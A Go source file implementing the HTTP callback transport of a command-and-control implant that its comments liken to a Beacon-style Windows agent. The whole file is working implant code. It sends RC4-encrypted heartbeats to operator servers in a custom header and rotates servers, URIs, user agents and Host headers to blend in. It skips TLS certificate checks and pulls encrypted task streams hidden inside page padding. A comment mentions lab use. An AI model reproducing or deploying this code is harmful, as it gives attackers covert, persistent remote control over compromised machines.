package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
)

// httpTransport implements the BeaconHTTP transport contract:
//
//	request : body = RC4(sessionKey, <size-prefixed task response stream>)
//	          header <parameter>: base64(RC4(listenerKey, beat))
//	response: body = <page prefix> + RC4(sessionKey, task stream) + <page suffix>
//
// The page prefix/suffix lengths are baked into the profile when the payload is
// generated, exactly like the Windows agent.
type httpTransport struct {
	cfg        *Config
	sessionKey []byte
	beatHeader string
	headers    [][2]string
	client     *http.Client

	srvIdx int
	uriIdx int
	uaIdx  int
	hhIdx  int
}

func newHTTPTransport(cfg *Config, beat []byte) (*httpTransport, error) {
	if len(cfg.HTTP.Servers) == 0 {
		return nil, errors.New("profile contains no callback server")
	}
	if len(cfg.HTTP.URIs) == 0 {
		return nil, errors.New("profile contains no callback URI")
	}
	if len(cfg.EncryptKey) != 16 {
		return nil, errors.New("profile contains an invalid listener key")
	}

	encBeat, err := rc4Crypt(beat, cfg.EncryptKey)
	if err != nil {
		return nil, err
	}

	t := &httpTransport{
		cfg:        cfg,
		beatHeader: base64.StdEncoding.EncodeToString(encBeat),
		client:     &http.Client{},
	}

	// Request headers from the listener profile. The Windows agent hands the
	// raw block to WinINet; here each "Name: value" line is applied directly.
	for _, line := range strings.FieldsFunc(cfg.HTTP.Headers, func(r rune) bool { return r == '\n' || r == '\r' }) {
		line = strings.TrimSpace(line)
		if line == "" || !strings.Contains(line, ":") {
			continue
		}
		idx := strings.Index(line, ":")
		name := strings.TrimSpace(line[:idx])
		value := strings.TrimSpace(line[idx+1:])
		if name == "" || strings.EqualFold(name, "Content-Length") || strings.EqualFold(name, "Host") {
			continue
		}
		t.headers = append(t.headers, [2]string{name, value})
	}

	tr := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives:   true,
		MaxIdleConns:        0,
		TLSHandshakeTimeout: 15 * time.Second,
		DialContext: (&net.Dialer{
			Timeout:   15 * time.Second,
			KeepAlive: 0,
		}).DialContext,
	}

	switch cfg.HTTP.ProxyType {
	case proxyHTTP, proxyHTTPS:
		if cfg.HTTP.ProxyHost != "" {
			pu := &url.URL{Scheme: "http", Host: cfg.HTTP.ProxyHost}
			if cfg.HTTP.ProxyPort != 0 {
				pu.Host = net.JoinHostPort(cfg.HTTP.ProxyHost, strconv.Itoa(int(cfg.HTTP.ProxyPort)))
			}
			if cfg.HTTP.ProxyType == proxyHTTPS {
				pu.Scheme = "https"
			}
			if cfg.HTTP.ProxyUser != "" {
				pu.User = url.UserPassword(cfg.HTTP.ProxyUser, cfg.HTTP.ProxyPass)
			}
			tr.Proxy = http.ProxyURL(pu)
		}
	default:
		// PROXY_TYPE_NONE: no proxy. (WinINet "preconfig" is deliberately not
		// emulated because environment proxies silently break lab callbacks.)
		tr.Proxy = nil
	}

	t.client.Transport = tr
	t.client.Timeout = 45 * time.Second

	if cfg.HTTP.Rotation == 1 {
		t.randomize()
	}
	return t, nil
}

func (t *httpTransport) randomize() {
	if n := len(t.cfg.HTTP.Servers); n > 0 {
		t.srvIdx = rand.Intn(n)
	}
	if n := len(t.cfg.HTTP.URIs); n > 0 {
		t.uriIdx = rand.Intn(n)
	}
	if n := len(t.cfg.HTTP.UserAgents); n > 0 {
		t.uaIdx = rand.Intn(n)
	}
	if n := len(t.cfg.HTTP.HostHeaders); n > 0 {
		t.hhIdx = rand.Intn(n)
	}
}

func (t *httpTransport) rotate() {
	n := len(t.cfg.HTTP.Servers)
	if t.cfg.HTTP.Rotation == 1 {
		t.randomize()
		return
	}
	t.srvIdx = (t.srvIdx + 1) % n
	if n := len(t.cfg.HTTP.URIs); n > 0 {
		t.uriIdx = (t.uriIdx + 1) % n
	}
	if n := len(t.cfg.HTTP.UserAgents); n > 0 {
		t.uaIdx = (t.uaIdx + 1) % n
	}
	if n := len(t.cfg.HTTP.HostHeaders); n > 0 {
		t.hhIdx = (t.hhIdx + 1) % n
	}
}

// exchange encrypts and transmits plain, then returns the decrypted response
// task stream. A nil, nil result means "checked in, nothing to do".
func (t *httpTransport) exchange(plain []byte, sessionKey []byte) ([]byte, error) {
	var body []byte
	if len(plain) > 0 {
		enc, err := rc4Crypt(plain, sessionKey)
		if err != nil {
			return nil, err
		}
		body = enc
	}

	var lastErr error
	for attempt := 0; attempt < len(t.cfg.HTTP.Servers); attempt++ {
		data, err := t.do(body)
		if err == nil {
			t.rotate()
			return data, nil
		}
		lastErr = err
		t.srvIdx = (t.srvIdx + 1) % len(t.cfg.HTTP.Servers)
	}
	return nil, lastErr
}

func (t *httpTransport) do(body []byte) ([]byte, error) {
	cfg := &t.cfg.HTTP

	host := cfg.Servers[t.srvIdx%len(cfg.Servers)]
	port := cfg.Ports[t.srvIdx%len(cfg.Ports)]

	scheme := "http"
	if cfg.UseSSL {
		scheme = "https"
	}
	uri := cfg.URIs[t.uriIdx%len(cfg.URIs)]

	target := fmt.Sprintf("%s://%s%s", scheme, net.JoinHostPort(host, strconv.Itoa(int(port))), uri)

	var reader io.Reader
	if len(body) > 0 {
		reader = bytes.NewReader(body)
	}

	req, err := http.NewRequest(cfg.Method, target, reader)
	if err != nil {
		return nil, err
	}

	if len(cfg.UserAgents) > 0 {
		req.Header.Set("User-Agent", cfg.UserAgents[t.uaIdx%len(cfg.UserAgents)])
	}
	for _, h := range t.headers {
		req.Header.Set(h[0], h[1])
	}
	// The heartbeat is carried in a dedicated header on every request.
	req.Header.Set(cfg.Parameter, t.beatHeader)
	if len(body) > 0 {
		req.Header.Set("Content-Type", "application/octet-stream")
		req.ContentLength = int64(len(body))
	}

	if len(cfg.HostHeaders) > 0 {
		hh := cfg.HostHeaders[t.hhIdx%len(cfg.HostHeaders)]
		if hh != "" {
			if !strings.Contains(hh, ":") {
				if (cfg.UseSSL && port != 443) || (!cfg.UseSSL && port != 80) {
					hh = net.JoinHostPort(hh, strconv.Itoa(int(port)))
				}
			}
			req.Host = hh
		}
	}

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 64*1024))
		return nil, fmt.Errorf("unexpected HTTP status %d", resp.StatusCode)
	}

	raw, err := io.ReadAll(io.LimitReader(resp.Body, 64*1024*1024))
	if err != nil {
		return nil, err
	}
	if len(raw) < cfg.AnsSize {
		return nil, nil
	}

	suffix := cfg.AnsSize - cfg.AnsPre
	if suffix < 0 || cfg.AnsPre > len(raw)-suffix {
		return nil, nil
	}
	payload := raw[cfg.AnsPre : len(raw)-suffix]
	if len(payload) == 0 {
		return nil, nil
	}

	out, err := rc4Crypt(payload, t.sessionKey)
	if err != nil {
		return nil, err
	}
	return out, nil
}

// sessionKey is attached during construction by the main loop.
func (t *httpTransport) setSessionKey(k []byte) { t.sessionKey = k }
